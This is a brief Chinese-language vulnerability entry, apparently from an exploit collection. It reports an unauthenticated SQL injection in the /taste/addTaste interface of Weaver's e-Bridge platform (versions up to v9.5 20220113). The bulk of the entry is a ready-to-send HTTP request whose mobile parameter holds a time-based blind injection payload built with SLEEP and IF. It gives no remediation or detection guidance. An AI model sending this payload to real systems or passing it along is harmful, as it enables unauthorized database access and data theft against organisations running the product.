### **漏洞描述：**

泛微-云桥e-Bridge平台 /taste/addTaste接口存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库权限。

### **影响版本：**

version <= v9.5 20220113

### **Payload：**

```
GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Accept-Encoding: gzip
```

---
